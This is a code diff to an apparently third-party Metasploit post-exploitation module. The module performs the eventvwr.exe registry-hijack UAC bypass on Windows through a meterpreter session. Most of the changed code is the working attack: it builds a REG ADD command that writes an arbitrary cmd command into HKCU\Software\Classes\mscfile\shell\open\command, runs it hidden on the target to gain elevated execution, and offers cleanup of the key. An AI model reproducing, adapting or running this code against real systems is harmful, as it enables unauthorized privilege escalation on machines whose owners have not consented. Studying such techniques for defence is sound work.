@@ -111,7 +111,7 @@ class MetasploitModule < Msf::Post
                         'DefaultTarget'  => '6', # default its to run againts windows 10
                         'References'     =>
                                 [
-                                         [ 'URL', 'goo.gl/XHQ6aF' ],
+                                         [ 'URL', 'POC: goo.gl/XHQ6aF' ],
                                          [ 'URL', 'http://sourceforge.net/users/peterubuntu10' ],
                                          [ 'URL', 'http://sourceforge.net/projects/msf-auxiliarys/repository' ]
 
@@ -120,6 +120,7 @@ class MetasploitModule < Msf::Post
 			'DefaultOptions' =>
 				{
                                          'SESSION' => '1', # Default its to run againts session 1
+                                         'CMD_COMMAND' => 'start notepad.exe', # Default cmd command (demo)
 				},
                         'SessionTypes'   => [ 'meterpreter' ]
  
@@ -128,7 +129,7 @@ class MetasploitModule < Msf::Post
                 register_options(
                         [
                                 OptString.new('SESSION', [ true, 'The session number to run this module on']),
-                                OptString.new('CMD_COMMAND', [ false, 'The cmd command to be executed (eg cmd.exe /c <command>)']),
+                                OptString.new('CMD_COMMAND', [ false, 'The cmd command to be executed']),
                                 OptBool.new('DEL_REGKEY', [ false, 'Delete malicious registry key hive?' , false])
                         ], self.class)
 
@@ -145,12 +146,11 @@ def ls_stage1
   r=''
   session = client
   exec_comm = datastore['CMD_COMMAND']                         # my cmd command to execute
-  # def_value = '(default)'                                    # registry key value (/ve = default = empty)
-  comm_path = '%WINDIR%\\System32\\cmd.exe /c'                 # %comspec% path 
-  vul_serve = '%WINDIR%\\System32\\eventvwr.exe'               # vulnerable soft to be hijacked
+  comm_path = '%SystemRoot%\\System32\\cmd.exe /c'             # %comspec% path 
+  vul_serve = '%SystemRoot%\\System32\\eventvwr.exe'           # vulnerable soft to be hijacked
   reg_clean = 'REG DELETE HKCU\\Software\\Classes\\mscfile /f' # registry hive to be clean in the end
   regi_hive = 'REG ADD HKCU\\Software\\Classes\\mscfile\\shell\\open\\command' # registry hive key to be hijacked
-  comm_inje = "#{regi_hive} /ve /t REG_SZ /d \"#{exec_comm}\" /f" # injection registry oneliner command
+  comm_inje = "#{regi_hive} /ve /t REG_SZ /d \"#{comm_path} #{exec_comm}\" /f" # injection registry oneliner command
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options...
   if datastore['CMD_COMMAND'] == 'nil'
@@ -165,22 +165,24 @@ def ls_stage1
 
     # search in target regedit for registry key existence
     print_warning("Reading service hive registry keys...")
-    sleep(1.0)
-    if registry_enumkeys("HKCU\\Software\\Classes\\mscfile\\shell\\open\\command")
+    Rex::sleep(1.0)
+    if registry_enumkeys("HKCU\\Software\\Classes")
       print_good(" Remote registry hive key found!")
       Rex::sleep(1.0)
     else
+       # registry key not found, aborting module execution.
        print_error("ABORT: post-module cant find the registry key needed...")
        Rex::sleep(1.0)
        return nil
     end
 
 
- # execute hijacking...
- # REG ADD HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /ve /t REG_SZ /d \"%WINDIR%\\System32\\cmd.exe /c start notepad.exe\" /f
- print_good(" Hijacking proccess to gain code execution!")
+ # Execute process hijacking in registry...
+ # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /t REG_SZ /d "c:\windows\System32\cmd.exe /c start notepad.exe" /f
+ print_good(" Hijacking proccess to gain code execution...")
  r = session.sys.process.execute("cmd.exe /c #{comm_inje}", nil, {'Hidden' => true, 'Channelized' => true})
- Rex::sleep(2.0)
+ # give a proper time to refresh regedit
+ Rex::sleep(5.0)
 
 
 end
@@ -219,7 +221,7 @@ def run
     print_line("")
 
 
-    # check for proper session.
+    # check for proper session (meterpreter)
     if not sysinfo.nil?
       print_status("Running module against: #{sysnfo['Computer']}")
     else
